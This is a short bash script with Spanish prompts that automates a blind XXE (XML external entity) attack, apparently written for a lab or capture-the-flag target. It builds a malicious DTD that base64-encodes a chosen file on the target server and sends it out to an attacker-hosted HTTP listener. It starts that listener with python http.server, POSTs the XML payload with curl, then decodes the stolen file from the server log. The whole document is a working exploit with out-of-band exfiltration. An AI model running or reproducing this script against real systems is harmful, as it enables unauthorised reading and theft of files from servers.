#!/bin/bash

echo -ne "\n [+] Introducir el fichero a leer: " && read -r myFilename

#Edit <ip>
malicious_dtd="""
<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval SYSTEM \"<!ENTITY &#x25; exfil SYSTEM 'http://<ip>/?file=%file;'>\"> 
%eval
%exfil;
"""

echo $malicious_dtd > malicious.dtd

python3 -m http.server 80 &>response &

PID=$!

sleep 1; echo

#Edit <ip> / <your_ip>
curl -s -X POST "http://<ip>" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<your_ip>malicious.dtd"> %xxe;]>
<root><name>test</name><tel>11234421</tel><email>test@test.com</email><password>test123</password></root>' &>/dev/null

cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d

kill -9 $PID
wait $PID 2>/dev/null

rm response 2>/dev/null

